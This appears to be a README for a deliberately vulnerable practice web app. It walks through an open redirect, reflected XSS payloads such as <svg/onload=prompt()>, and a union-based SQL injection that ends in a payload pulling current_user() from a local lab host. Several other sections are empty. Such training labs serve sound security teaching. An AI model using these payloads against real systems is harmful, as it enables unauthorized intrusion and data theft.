## About The Garden

It's vulnerable by purpose.


## Open Redirect

Visit: http://thegarden.local.net/login?r=http://10degres.net and log in.

## Information disclosure

- 

## IDOR

- 

## XSS

Visit http://thegarden.local.net/?q=111%27%22--%3E%3Cu%3E111 and ensure that HTML is interpreted.
Then use a XSS payload: <svg/onload=prompt()>

Visit http://thegarden.local.net/reset-password/111?email=111%27%22--%3E%3Cu%3E111 and ensure that HTML is interpreted.
Then use a XSS payload: 111"><svg/onload=prompt()>

## CSRF

- 

## SQL injection

Visit http://thegarden.local.net/login and login in.
Visit http://thegarden.local.net/orders and click on the details link of on order.
The following API call is performed http://thegarden.local.net/api/orders/29
Add a quote to the end of the path http://thegarden.local.net/api/orders/29%27 
You'll get some error messages:
"Illuminate\Database\QueryException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''29''' at line 1 (SQL: SELECT * FROM orders WHERE id='29'') in file /Users/gwen/Public/thegarden/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 742""
Check the number of columns the query as:
is ok: http://thegarden.local.net/api/orders/29%27%20order%20by%2015%23
is too much: http://thegarden.local.net/api/orders/29%27%20order%20by%2016%23
Use the `union` technic: http://thegarden.local.net/api/orders/29%27%20union%20select%20null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20order%20by%20id%23
Final payload: %27%20union%20select%20null,current_user(),null,null,null,null,null,null,null,null,null,null,null,null,null%20order%20by%20id%23

